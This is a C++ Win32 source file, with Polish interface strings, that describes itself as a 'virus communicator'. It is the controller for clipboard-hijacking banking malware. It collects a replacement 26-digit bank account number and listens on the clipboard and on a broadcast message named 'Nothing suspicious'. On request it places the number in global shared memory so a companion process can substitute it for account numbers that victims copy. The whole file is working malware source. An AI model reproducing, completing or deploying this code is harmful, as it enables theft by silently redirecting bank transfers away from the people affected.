#include <Windows.h>
#include "resource2.h"

#define REQUEST_NUMBER	0xDEAD
#define POST_NUMBER		0xBEEF
#define MAXL			26
#define MY_BN_CLICKED	1001

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow);
bool init(HINSTANCE hInstance);
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
void MoveToCb();
void PostNumber();
INT_PTR CALLBACK DialogProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
void GLEMAS();

constexpr CHAR szClassName[] = "KomunikatorWirusa";
constexpr CHAR windowTitle[] = "Komunikator Wirusa";
constexpr CHAR msgName[] = "Nic podejrzanego";
LPSTR bankAccount;
HWND hwndThis;
UINT messageCode;
bool bAset;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	if (!init(hInstance)) return 1;

	MSG msg;

	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
		if (!bAset)
			DialogBox(
				hInstance,
				MAKEINTRESOURCE(IDD_FORMVIEW),
				hwndThis,
				DialogProc
			);
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}

bool init(HINSTANCE hInstance)
{
	WNDCLASSEX wc;

	wc.cbSize = sizeof(WNDCLASSEX);
	wc.style = 0;
	wc.lpfnWndProc = WndProc;
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0;
	wc.hInstance = hInstance;
	wc.hIcon = NULL;
	wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
	wc.hbrBackground = NULL;
	wc.lpszMenuName = NULL;
	wc.lpszClassName = szClassName;
	wc.hIconSm = NULL;

	if (!RegisterClassEx(&wc)) return false;

	hwndThis = CreateWindowEx(
		NULL,
		wc.lpszClassName,
		windowTitle,
		WS_TILEDWINDOW | WS_VISIBLE,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		335,
		85,
		NULL,
		NULL,
		hInstance,
		NULL
	);

	if (hwndThis == NULL) return false;

	if (!AddClipboardFormatListener(hwndThis)) return false;

	HWND hwndButton = CreateWindow(
		"BUTTON",	// Predefined class; Unicode assumed 
		"Podaj nowy numer konta bankowego", // Button text 
		WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON, // Styles 
		10,         // x position 
		10,         // y position 
		300,        // Button width
		30,        // Button height
		hwndThis,   // Parent window
		NULL,       // No menu.
		(HINSTANCE)GetWindowLong(hwndThis, GWL_HINSTANCE),
		NULL		// Pointer not needed.
	);

	messageCode = RegisterWindowMessage(msgName);

	bankAccount = (LPSTR)calloc(MAXL + 1, sizeof(CHAR));
	bAset = false;

	return true;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	if (msg == messageCode)
	{
		switch (wParam)
		{
		case REQUEST_NUMBER:
			if (!bAset) break; // Brak konta bankowego do nadpisania
			PostNumber();
			break;
		}
	} else 
	switch (msg)
	{
	case WM_COMMAND:
		switch (wParam)
		{
		case BN_CLICKED:
			bAset = false;
			break;
		default:
			break;
		}
		break;
	case WM_CLOSE:
		DestroyWindow(hwnd);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hwnd, msg, wParam, lParam);
	}
	return 0;
}

void PostNumber()
{
	HANDLE hMem = CreateFileMapping(
		INVALID_HANDLE_VALUE,
		NULL,
		PAGE_READWRITE,
		0,
		MAXL + 1,
		"Global\\FM_V"
		);
	if (hMem == NULL) GLEMAS();
	LPCTSTR pBuf = (LPTSTR)MapViewOfFile(
		hMem,
		FILE_MAP_ALL_ACCESS,
		0,
		0,
		MAXL + 1
		);
	if (pBuf == NULL) GLEMAS();
	CopyMemory((PVOID)pBuf, bankAccount, (MAXL + 1)*sizeof(CHAR));

	UnmapViewOfFile(pBuf);
	//CloseHandle(hMem);

	PostMessage(HWND_BROADCAST, messageCode, POST_NUMBER, NULL);
}

void GLEMAS()
{
	wchar_t buf[256];
	FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		buf, (sizeof(buf) / sizeof(wchar_t)), NULL);
	int i = 0;
}

INT_PTR CALLBACK DialogProc(HWND hDlg, UINT msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg)
	{
	case WM_INITDIALOG:
		SendDlgItemMessage(
			hDlg,
			IDC_EDIT1,
			EM_SETLIMITTEXT,
			MAXL,
			NULL
		);
		break;
	/*case EN_CHANGE:
		SendDlgItemMessage(
			hDlg,
			IDC_BUTTON1,
			WM_ENABLE,
			TRUE,
			TRUE
		);
		break;*/
	case WM_COMMAND:
		switch (wParam)
		{
		case MY_BN_CLICKED:
			bankAccount[0] = 0;
			bankAccount[1] = MAXL;
			SendDlgItemMessage(
				hDlg,
				IDC_EDIT1,
				EM_GETLINE,
				NULL,
				LPARAM(bankAccount)
			);
			if (strlen(bankAccount) == MAXL)
			{
				bAset = true;
				EndDialog(hDlg, TRUE);
			}
			break;
		default:
			break;
		}
		break;
	
	default:
		return DefWindowProc(hDlg, msg, wParam, lParam);
	}
	return 0;
}